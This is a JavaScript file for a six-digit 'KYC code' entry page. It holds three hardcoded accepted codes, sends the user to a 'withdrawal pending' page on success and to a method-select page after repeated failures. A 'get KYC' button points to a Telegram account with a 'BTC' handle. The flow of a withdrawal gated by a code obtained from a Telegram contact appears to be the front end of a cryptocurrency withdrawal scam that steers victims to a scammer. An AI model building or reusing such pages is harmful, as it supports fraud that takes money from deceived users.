'use strict';

const inputs = document.querySelectorAll('input');
const error_box = document.querySelector('.error');
const get_kyc_btn = document.querySelector('b');
const btn = document.getElementById('btn');

const kyc1 = ['3','3','6','6','5','7'];
const kyc2 = ['1','1','4','9','1','2'];
const kyc3 = ['6','6','3','9','2','1'];

var u_input = [];
var tryal_counter=0;

// loop through all inputs
inputs.forEach((input, index) => {
    // add input event to input at index i
    input.addEventListener('input', () => {
        // if a single value is entered
        if(input.value.length === 1){
            // remove error box if exist
            error_box.classList.remove('display');
            // adding the cuurent index to the user-input array
            u_input[index]=input.value;
            // check if the user is not fucus on last input
            if(index < inputs.length -1){
                // change fucus to the next input
                inputs[index +1].focus();
            }
            // check if user is fucus on the last input
            if(inputs[5].value.length === 1){
                // change fucus to the button
                btn.focus();
            }
        }
        // check if user is fucus on the last input
        if(inputs[5].value.length === 1){
            // make the button ready for user click
            btn.addEventListener('click', () => {
                // increament tryal_counter
                tryal_counter += 1;
                // validate the user secret code
                validate_secret_code(kyc1, u_input);
            });  
        }
    });
});

get_kyc_btn.addEventListener('click', () => {
    location.assign("https://t.me/AGATHA_CASTROBTC2");
    // location.assign("{{url('/user/account')}}");
});

// these function checks if the user enter the correct code then take it to a new page
function validate_secret_code(kyc1, u_input){

    // check if user input is equal to secret code
    if(kyc1[0]===u_input[0] && kyc1[1]===u_input[1] && kyc1[2]===u_input[2]
        && kyc1[3]===u_input[3] && kyc1[4]===u_input[4] && kyc1[5]===u_input[5]){

            // redirect to login page
            location.href="/views/kyc6/withdrawal_pending.html";

    }else if(kyc2[0]===u_input[0] && kyc2[1]===u_input[1] && kyc2[2]===u_input[2]
        && kyc2[3]===u_input[3] && kyc2[4]===u_input[4] && kyc2[5]===u_input[5]){

            // redirect to login page
            location.href="/views/kyc6/withdrawal_pending.html";

    }else if(kyc3[0]===u_input[0] && kyc3[1]===u_input[1] && kyc3[2]===u_input[2]
        && kyc3[3]===u_input[3] && kyc3[4]===u_input[4] && kyc3[5]===u_input[5]){

            // redirect to login page
            location.href="/views/kyc6/withdrawal_pending.html";

    }else{

        // else display error massage
        error_box.classList.add('display');
        // erase all inputs
        erase_inputs();
        // if the user try wrong pin for some times redirect him to home page
        if(tryal_counter === 2){
            location.assign("/views/kyc6/method_select.html");
        }
    }
}

// these funtion erase all inputs values
function erase_inputs(){
    inputs.forEach(input => {
        input.value=null;
    });
}